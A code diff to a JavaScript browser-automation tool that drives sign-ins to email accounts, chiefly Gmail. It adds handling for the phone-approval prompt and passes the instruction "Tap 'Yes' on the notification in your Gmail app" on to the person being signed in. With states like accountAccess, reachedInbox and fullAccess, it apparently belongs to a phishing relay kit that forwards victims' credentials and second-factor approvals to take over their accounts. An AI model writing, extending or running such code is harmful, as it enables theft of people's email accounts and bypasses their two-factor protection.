@@ -3498,11 +3498,13 @@ if (!foundSelector) {
                                     const verificationDetails = await checkVerification(page, platformConfig);
                                     logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Verification details after password: ${JSON.stringify(verificationDetails)}`);
                                     if (verificationDetails.required) {
+                                        const isPhonePrompt = verificationDetails.type === 'phone_prompt';
                                         initialCheckResult = {
                                             emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true,
                                             verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : verificationDetails.type === 'text_input' ? 'WAITINGRECOVERYEMAIL' : verificationDetails.type === 'password' ? 'WAITINGPASSWORD_ERROR' : 'WAITINGCODE',
                                             verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
-                                            viewName: verificationDetails.viewName
+                                            viewName: verificationDetails.viewName,
+                                            gmail: isPhonePrompt ? { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." } : undefined
                                         };
                                     } else {
                                         // HARD GATE: even though the poll above found no error, re-check right
@@ -3806,7 +3808,24 @@ if (!foundSelector) {
             }
             // Update updateData based on the result of the polling loop
             updateData.status = finalStatus;
-            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
+            if ((finalStatus === "WAITINGCODE" || initialCheckResult.verificationState === "WAITINGCODE") && initialCheckResult.gmail) {
+                finalStatus = "WAITINGCODE";
+                updateData.status = "WAITINGCODE";
+                const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
+                updateData.lastJsonResponse = JSON.stringify({
+                    ...ljp,
+                    status: "WAITING_CODE",
+                    verificationState: 'WAITING_CODE',
+                    viewName: ljp.viewName || initialCheckResult.viewName || null,
+                    gmail: initialCheckResult.gmail,
+                    message: initialCheckResult.gmail.instructions || "Awaiting verification."
+                });
+                updateBrowserRowDataFast(browserId, {
+                    status: "WAITINGCODE", verified: true, fullAccess: false,
+                    lastJsonResponse: updateData.lastJsonResponse,
+                    gmail: initialCheckResult.gmail
+                });
+            } else if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Something went wrong. Please try again."
@@ -3880,6 +3899,29 @@ if (!foundSelector) {
                             status: "WAITINGRECOVERYEMAIL",
                             verificationChoice: '',
                             lastJsonResponse: updateData.lastJsonResponse
+                        });
+                        return;
+                    }
+                    if (currentPageVerificationState.type === 'phone_prompt') {
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to phone prompt: ${currentPageVerificationState.viewName}. Setting WAITINGCODE with phone prompt metadata.`);
+                        finalStatus = "WAITINGCODE";
+                        const ljpPP = JSON.parse(updateData.lastJsonResponse || '{}');
+                        updateData = {
+                            status: "WAITINGCODE",
+                            verificationChoice: '',
+                            lastJsonResponse: JSON.stringify({
+                                ...ljpPP,
+                                status: "WAITING_CODE",
+                                verificationState: 'WAITING_CODE',
+                                viewName: currentPageVerificationState.viewName,
+                                gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." },
+                                message: "Phone prompt — check your phone."
+                            })
+                        };
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGCODE", verified: true, fullAccess: false,
+                            lastJsonResponse: updateData.lastJsonResponse,
+                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." }
                         });
                         return;
                     }
@@ -4146,6 +4188,26 @@ if (!foundSelector) {
                                     };
                                     updateBrowserRowDataFast(browserId, updateData);
                                     break;
+                                } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'phone_prompt') {
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to phone prompt: ${gmailPostClickVerification.viewName}. Setting WAITINGCODE with phone prompt metadata.`);
+                                    finalStatus = "WAITINGCODE";
+                                    const ljpGmailPP = JSON.parse(updateData.lastJsonResponse || '{}');
+                                    updateData = {
+                                        status: "WAITINGCODE",
+                                        verificationChoice: '',
+                                        gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." },
+                                        lastJsonResponse: JSON.stringify({
+                                            ...ljpGmailPP,
+                                            status: "WAITING_CODE",
+                                            verificationState: 'WAITING_CODE',
+                                            viewName: gmailPostClickVerification.viewName,
+                                            gmail: { step: 'waiting_app_notification', canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." },
+                                            verificationOptions: currentVerificationOptions,
+                                            message: "Phone prompt — check your phone."
+                                        })
+                                    };
+                                    updateBrowserRowDataFast(browserId, updateData);
+                                    break;
                                 } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'text_input') {
                                     logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to text input: ${gmailPostClickVerification.viewName}. Setting WAITINGRECOVERYEMAIL.`);
                                     finalStatus = "WAITINGRECOVERYEMAIL";
@@ -4358,13 +4420,23 @@ if (!foundSelector) {
             initialCheckResult.emailExists = true;
             if (updateData.status !== "WAITINGCODE") {
                 updateData.status = "WAITINGCODE";
+                const _cachedRowForGmail = getCachedRow(browserId) || {};
+                const _existingLjr = JSON.parse(updateData.lastJsonResponse || '{}');
+                const _cachedLjr = JSON.parse(_cachedRowForGmail.lastJsonResponse || '{}');
+                const _gmailMeta = _cachedRowForGmail.gmail || _existingLjr.gmail || _cachedLjr.gmail || null;
                 updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_CODE",
+                    ..._existingLjr,
+                    ...(_gmailMeta ? { gmail: _gmailMeta } : {}),
+                    status: "WAITING_CODE",
                     verificationState: 'WAITING_CODE',
-                    viewName: JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName || null,
-                    message: "Awaiting verification code."
+                    viewName: _existingLjr.viewName || _cachedLjr.viewName || initialCheckResult.viewName || null,
+                    message: _gmailMeta?.instructions || "Awaiting verification code."
                 });
-                updateBrowserRowDataFast(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
+                updateBrowserRowDataFast(browserId, {
+                    status: "WAITINGCODE", verified: true, fullAccess: false,
+                    lastJsonResponse: updateData.lastJsonResponse,
+                    ...(_gmailMeta ? { gmail: _gmailMeta } : {})
+                });
             }
 
 
